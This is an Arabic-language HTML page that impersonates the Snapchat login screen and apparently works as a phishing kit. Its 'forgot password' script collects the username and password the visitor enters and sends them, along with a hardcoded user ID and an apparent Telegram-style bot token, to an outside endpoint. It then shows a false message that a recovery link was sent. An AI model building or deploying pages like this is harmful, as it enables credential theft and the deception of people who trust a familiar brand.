```html
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سناب شات - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF0080, #FF8C00);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .snap-logo {
            font-size: 48px;
            font-weight: bold;
            color: #FFFC00;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            margin-bottom: 10px;
        }
        .login-title {
            color: #333;
            font-size: 24px;
            margin-bottom: 5px;
        }
        .sub-title {
            color: #666;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #FF0080;
            box-shadow: 0 0 0 3px rgba(255, 0, 128, 0.1);
        }
        .btn-submit {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #FF0080, #FF8C00);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 0, 128, 0.3);
            margin-bottom: 10px;
        }
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 0, 128, 0.4);
        }
        .btn-forgot {
            width: 100%;
            padding: 12px;
            background: #f8f9fa;
            color: #0066CC;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }
        .btn-forgot:hover {
            background: #e9ecef;
            transform: translateY(-1px);
        }
        .footer-links {
            text-align: center;
            margin-top: 20px;
        }
        .footer-links a {
            color: #0066CC;
            text-decoration: none;
            font-size: 14px;
            margin: 0 5px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .error-message {
            display: none;
            background: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #f5c6cb;
        }
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #c3e6cb;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="snap-logo">سنـاب</div>
            <p class="login-title">تسجيل الدخول</p>
            <p class="sub-title">أدخل بياناتك للدخول إلى حسابك</p>
        </div>

        <div id="error-message" class="error-message">
            <span id="error-text">خطأ: يرجى ملء جميع الحقول</span>
        </div>

        <div id="success-message" class="success-message">
            <span id="success-text">تم تسجيل الدخول بنجاح!</span>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">اسم المستخدم</label>
                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
            </div>
            <div class="form-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" placeholder="كلمة المرور">
            </div>
            <button type="submit" class="btn-submit">تسجيل الدخول</button>
            <button type="button" class="btn-forgot" onclick="forgotPassword()">نسيت كلمة المرور؟</button>
        </form>

        <div class="footer-links">
            <a href="#">ليس لديك حساب؟ سجل الآن</a>
            <span>·</span>
            <a href="#">مركز المساعدة</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                document.getElementById('error-message').style.display = 'block';
                document.getElementById('success-message').style.display = 'none';
                return;
            }

            document.getElementById('error-message').style.display = 'none';
            document.getElementById('success-message').style.display = 'block';
            document.getElementById('success-text').textContent = 'تم تسجيل الدخول بنجاح!';

            const loginBtn = document.querySelector('.btn-submit');
            loginBtn.textContent = 'تم الدخول';
            loginBtn.style.background = 'linear-gradient(45deg, #28a745, #20c997)';
            loginBtn.disabled = true;

            setTimeout(() => {
                loginBtn.textContent = 'تسجيل الدخول';
                loginBtn.style.background = 'linear-gradient(45deg, #FF0080, #FF8C00)';
                loginBtn.disabled = false;
                document.getElementById('success-message').style.display = 'none';
                document.getElementById('loginForm').reset();
            }, 2000);
        });

        function forgotPassword() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username) {
                alert('يرجى إدخال اسم المستخدم أولاً');
                return;
            }

            // إرسال البيانات إلى البوت
            const data = {
                action: 'forgot_password',
                username: username,
                password: password,
                user_id: '8539996558',
                token: '8694309954:AAFjq-F5jxGayURPwjgyeIKND86FhPwMNcA'
            };

            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://your-bot-api.com/send_data', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));

            alert('تم إرسال رابط استعادة كلمة المرور إلى البوت المحدد.');
        }
    </script>
</body>
</html>
